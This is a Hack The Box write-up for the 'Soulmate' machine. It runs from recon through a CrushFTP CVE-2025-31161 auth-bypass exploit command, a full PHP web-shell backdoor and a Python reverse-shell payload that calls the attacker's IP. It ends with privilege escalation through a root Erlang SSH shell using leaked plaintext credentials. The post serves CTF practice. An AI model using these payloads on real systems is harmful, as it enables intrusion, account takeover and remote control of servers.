---
title: Soulmate — HTB
author: Radeel Ahmad
pubDatetime: 2025-09-11T08:43:00Z
tags:
  - hacking
  - HTB
  - CrushFTP
  - CVE-2025-31161
  - Erlang
description:
  Hack The Box "Soulmate" walkthrough — CrushFTP CVE-2025-31161 auth bypass to admin, a PHP backdoor upload, pivoting into an Erlang SSH service, and OS command execution via the Erlang shell for root.
---

### Soulmate — HTB

In this article, I will provide a step-by-step guide to solve the Hack The Box machine '**Soulmate**'.

![](/blog/images/htb/1*QmgRTTjh5DgIfRkn4UXMGg.png)

Nmap Scan:

```
┌──(kali㉿kali)-[~/Downloads]
└─$ nmap -sV -sC 10.10.11.86
Starting Nmap 7.95 ( https://nmap.org ) at 2025-09-11 08:43 UTC
Nmap scan report for 10.10.11.86
Host is up (0.55s latency).
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.13 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   256 3e:ea:45:4b:c5:d1:6d:6f:e2:d4:d1:3b:0a:3d:a9:4f (ECDSA)
|_  256 64:cc:75:de:4a:e6:a5:b4:73:eb:3f:1b:cf:b4:e3:94 (ED25519)
80/tcp open  http    nginx 1.18.0 (Ubuntu)
|_http-server-header: nginx/1.18.0 (Ubuntu)
|_http-title: Did not follow redirect to http://soulmate.htb/
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 749.87 seconds
```

Update `etc/hosts`:

```
10.10.11.86 soulmate.htb
```

![](/blog/images/htb/1*wZRg7Tp75ycK2NTS-D1scQ.png)

Signup:

![](/blog/images/htb/1*L3rLygWYiH8x4Nbo6W5ozQ.png)

login:

![](/blog/images/htb/1*WhbRrgANX2qnvaVh99s-7A.png)

fuzz subdomains.

```
┌──(kali㉿kali)-[~/Desktop/HTB/Soulmate]
└─$ ffuf -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt -u http://10.10.11.86 -H "Host: FUZZ.soulmate.htb" -fw 4

        /'___\  /'___\           /'___\
       /\ \__/ /\ \__/  __  __  /\ \__/
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/
         \ \_\   \ \_\  \ \____/  \ \_\
          \/_/    \/_/   \/___/    \/_/

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://10.10.11.86
 :: Wordlist         : FUZZ: /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt
 :: Header           : Host: FUZZ.soulmate.htb
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
 :: Filter           : Response words: 4
________________________________________________

ftp                     [Status: 302, Size: 0, Words: 1, Lines: 1, Duration: 428ms]
```

Again update `etc/hosts`:

```
10.10.11.86 ftp.soulmate.htb
```

![](/blog/images/htb/1*yzO4BH0O3cz7oBouRa14Vg.png)

Check the Source Code for Version Hints

```
"/WebInterface/new-ui/assets/app/components/loader2.js?v=11.W.657-2025_03_08_07_52">
```

**CrushFTP CVE-2025-31161 Auth Bypass and Post-Exploitation | Huntress** — Huntress observed in-the-wild exploitation of CVE-2025-31161, an authentication bypass vulnerability in versions of CrushFTP.

#### CVE-2025–31161

**GitHub - Immersive-Labs-Sec/CVE-2025-31161** — Proof of Concept for CVE-2025-31161 / CVE-2025-2825.

We clone the repo and exploit CVE-2025–31161 to add user **test**

```
python3 cve-2025-31161.py --target_host ftp.soulmate.htb --port 80 --target_user root --new_user test --password test
```

![](/blog/images/htb/1*OwvzJ-Jo2vNS76lsqsey_w.png)

We login with our created user, and we successfully login as an User with admin rights.

![](/blog/images/htb/1*vCe1rivlH4p3KLj6qCghNA.png)

We go to the **Admin Section/User Manager**

![](/blog/images/htb/1*0fE34Pd0FN_72LwX4Kox5A.png)

I changed the password of the user ben to test. Click on save

![](/blog/images/htb/1*2X1FgsOMwJyELF1o8SVDgA.png)

Now login as ben

![](/blog/images/htb/1*cypvhA3E9V7GPxDVrxoSeg.png)

#### Backdoor.php:

```
┌──(kali㉿kali)-[~/Desktop/HTB/Soulmate]
└─$ cat backdoor.php
<!-- Simple PHP backdoor by DK (http://michaeldaw.org) --><?php
if(isset($_REQUEST['cmd'])){
 echo "<pre>";
 $cmd = ($_REQUEST['cmd']);
 system($cmd);
 echo "</pre>";
 die;
}
?>
Usage: http://target.com/simple-backdoor.php?cmd=cat+/etc/passwd
```

We upload a **backdoor.php**

![](/blog/images/htb/1*3FtZl_HI1iDGGZ7sn2AVFA.png)

We open the shell in `http://soulmate.htb/backdoor.php`

![](/blog/images/htb/1*xElq1lgwgX6SCmqKkBKJYw.png)

Reverse Shell:

```
http://soulmate.htb/backdoor.php?cmd=python3%20-c%20%27import%20socket%2Csubprocess%2Cos%3Bs%3Dsocket.socket(socket.AF_INET%2Csocket.SOCK_STREAM)%3Bs.connect((%2210.10.14.40%22%2C4444))%3Bos.dup2(s.fileno()%2C0)%3B%20os.dup2(s.fileno()%2C1)%3Bos.dup2(s.fileno()%2C2)%3Bimport%20pty%3B%20pty.spawn(%22sh%22)%27
```

Start the listener, and after trigger we got a shell

![](/blog/images/htb/1*2n-qoD3WF7Qtu37Cd3KFpg.png)

> While reviewing the LinPEAS output, we repeatedly encountered references to Erlang components, suggesting that the environment relies heavily on Erlang

We checked the **erlang_login Directory** and we found the creds

```
www-data@soulmate:~/soulmate.htb/public$ cat /usr/local/lib/erlang_login/start.escript
<blic$ cat /usr/local/lib/erlang_login/start.escript
#!/usr/bin/env escript
%%! -sname ssh_runner

main(_) ->
    application:start(asn1),
    application:start(crypto),
    application:start(public_key),
    application:start(ssh),

    io:format("Starting SSH daemon with logging...~n"),

    case ssh:daemon(2222, [
        {ip, {127,0,0,1}},
        {system_dir, "/etc/ssh"},

        {user_dir_fun, fun(User) ->
            Dir = filename:join("/home", User),
            io:format("Resolving user_dir for ~p: ~s/.ssh~n", [User, Dir]),
            filename:join(Dir, ".ssh")
        end},

        {connectfun, fun(User, PeerAddr, Method) ->
            io:format("Auth success for user: ~p from ~p via ~p~n",
                      [User, PeerAddr, Method]),
            true
        end},

        {failfun, fun(User, PeerAddr, Reason) ->
            io:format("Auth failed for user: ~p from ~p, reason: ~p~n",
                      [User, PeerAddr, Reason]),
            true
        end},

        {auth_methods, "publickey,password"},

        {user_passwords, [{"ben", "HouseH0ldings998"}]},
        {idle_time, infinity},
        {max_channels, 10},
        {max_sessions, 10},
        {parallel_login, true}
    ]) of
        {ok, _Pid} ->
            io:format("SSH daemon running on port 2222. Press Ctrl+C to exit.~n");
        {error, Reason} ->
            io:format("Failed to start SSH daemon: ~p~n", [Reason])
    end,

    receive
        stop -> ok
    end.
```

- ben — HouseH0ldings998

Access SSH as ben

```
┌──(kali㉿kali)-[~/Desktop/HTB/Soulmate]
└─$ ssh ben@10.10.11.86
The authenticity of host '10.10.11.86 (10.10.11.86)' can't be established.
ED25519 key fingerprint is SHA256:TgNhCKF6jUX7MG8TC01/MUj/+u0EBasUVsdSQMHdyfY.
This host key is known by the following other names/addresses:
    ~/.ssh/known_hosts:32: [hashed name]
    ~/.ssh/known_hosts:43: [hashed name]
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.10.11.86' (ED25519) to the list of known hosts.
ben@10.10.11.86's password:
Last login: Thu Sep 11 10:09:12 2025 from 10.10.14.40
ben@soulmate:~$ cat user.txt
5b0dfdfa1636a****************
ben@soulmate:~$
```

---

### Privilege Escalation:

> Since we previously observed with Netcat that an SSH service is running on port 2222, we decided to attempt logging in using the user ben

We pivot via SSH on port 2222 as ben, and we are inside the **erlang shell**

![](/blog/images/htb/1*yS-5BCd_fhSRqUih4x4dGA.png)

**OS command and code execution in Erlang and Elixir applications** — execution of OS commands and code evaluation are dangerous operations when they use untrusted user input.

- We execute id command via Erlang shell
- We read root.txt via Erlang shell

```
(ssh_runner@soulmate)2> os:cmd("id").
"uid=0(root) gid=0(root) groups=0(root)\n"
(ssh_runner@soulmate)3> os:cmd("cat /root/root.txt").
"dcdb2757ecdc8***************\n"
(ssh_runner@soulmate)4>
```

---

**Thank You** for reading this article. I hope that you have found this information provided to be valuable and helpful. Use it for educational purposes only…. 🙂

**RADEEL AHMAD**
